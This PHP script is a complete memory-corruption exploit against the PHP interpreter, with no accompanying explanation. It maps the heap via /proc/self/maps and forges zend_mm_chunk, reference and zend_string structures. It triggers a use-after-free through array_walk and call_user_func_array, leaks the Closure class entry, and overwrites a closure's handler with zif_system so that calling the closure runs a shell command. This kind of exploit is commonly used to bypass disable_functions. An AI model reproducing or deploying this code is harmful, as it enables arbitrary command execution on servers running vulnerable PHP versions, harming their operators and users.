<?php
$dummy_chunk = str_repeat('a',4194304); //4M
$file = fopen('/proc/self/maps','r');

while(!feof($file)){
	$line = fgets($file);
	$arr = explode(" ",$line);
	$range = explode("-",$arr[0]);
	$start = intval($range[0],16);
	$end = intval($range[1],16);
	if(($end-$start)==0x401000){
		echo $line;
		echo "\n";
		//flush();
		//ob_flush();
				
		$mmap = $start;
	}else if(($end-$start)==0x200000){
		echo $line;
		echo "\n";
		$main_chunk = $start;	
	}
}

$mm_heap = $main_chunk+0x40; //zend_mm_chunk + 0x40
$fake_chunk_adr = $mmap+0x200000; //half of out dummy_chunk

fake_chunk(); // for the zend_string -> val

trigger();

function trigger(){
	global $dummy_chunk;
	global $mmap;
	global $fake_chunk_adr;

	$free_bin = closure_bin();
	class A{  
  		public function __construct(){  
     			// str_ireplace could be replaced by other functions which have "reference args" such as similar_text etc.
        		$this->{'str_ireplace'} = "call_user_func_array";                                                
   		}  
	}	  

	//arguments list
	$args = array("a","b","a",$free_bin);  
	$helper = new A();
	
	array_walk($helper, "call_user_func", $args);
	
	//alloc closure

	$func = function($a){};

	//var_dump($func,$dummy_chunk);
	//uaf motify closure
	
	//echo ($free_bin)."\n";
	//echo ($mmap)."\n".
	//printf("%x",$fake_chunk_adr + 0x1000);

	var_dump($func);

	$closure_ce = str2ptr(read4str($dummy_chunk, $fake_chunk_adr + 0x1000 + 0x18 - $mmap -0x18,8),0); 
	printf("%x",$closure_ce);	
	//$zif_system = $closure_ce - 0xa06049;
	$zif_system = $closure_ce - 0x2a6060;

	write($dummy_chunk, $fake_chunk_adr + 0x1000 + 0x38 - $mmap -0x18,1);
	write($dummy_chunk, $fake_chunk_adr + 0x1000 + 0x68 - $mmap -0x18,$zif_system);
	//finally;	
	$func('touch 1111');
}


function closure_bin(){ 
	global $dummy_chunk;
	global $mmap;
	global $fake_chunk_adr;

	//fixed one page
	$free_adr = $fake_chunk_adr + 0x1000; //so page_num = 1

	//change chunk->map
	write($dummy_chunk,$fake_chunk_adr-$mmap+0x208+0x04-0x18,(0x80000000 | 16));

	//fixed the fake reference
	
	$fake_reference = $mmap+0x20;

	//set reference->val to zend_string
	write($dummy_chunk,$fake_reference-$mmap-0x18+0x8,$free_adr);
	//set zval->type_info to zend_string | refcounted
	write($dummy_chunk,$fake_reference-$mmap-0x18+0x10,(6 | (1<<8)));
	//sey reference->source to 0 
	write($dummy_chunk,$fake_reference-$mmap-0x18+0x18,0);

	//fake zend_string
	//set refecount = 1 , so can be free. 
	write($dummy_chunk,$free_adr-$mmap-0x18,0x600000001);

	return $fake_reference;
}

function fake_chunk(){
	global $mmap;
	global $dummy_chunk;
	global $fake_chunk_adr;
	global $mm_heap;
	echo ($fake_chunk_adr-$mmap-0x18).",".$mm_heap;
	write($dummy_chunk,$fake_chunk_adr - $mmap -0x18,$mm_heap);//set zend_mm_chunk -> heap
}

function read4str($str,$offset,$len){
	$stub="";
	for($i=0;$i<$len;$i++){
		$stub=$stub.$str[$offset+$i];
	}

	return $stub;
}


function str2ptr(&$str, $p, $s=8)
{
	$address = 0;
	for($j=$p+$s-1;$j>=$p;$j--)
	{
		$address <<= 8;
		$address |= ord($str[$j]);
	}
	return $address;
}


function write(&$str, $p, $v)
	{
		$str[$p+0] = chr($v & 0xff);
		$v >>= 8;
		$str[$p+1] = chr($v & 0xff);
		$v >>= 8;
		$str[$p+2] = chr($v & 0xff);
		$v >>= 8;
		$str[$p+3] = chr($v & 0xff);
		$v >>= 8;
		$str[$p+4] = chr($v & 0xff);
		$v >>= 8;
		$str[$p+5] = chr($v & 0xff);
		$v >>= 8;
		$str[$p+6] = chr($v & 0xff);
		$v >>= 8;
		$str[$p+7] = chr($v & 0xff);
	}
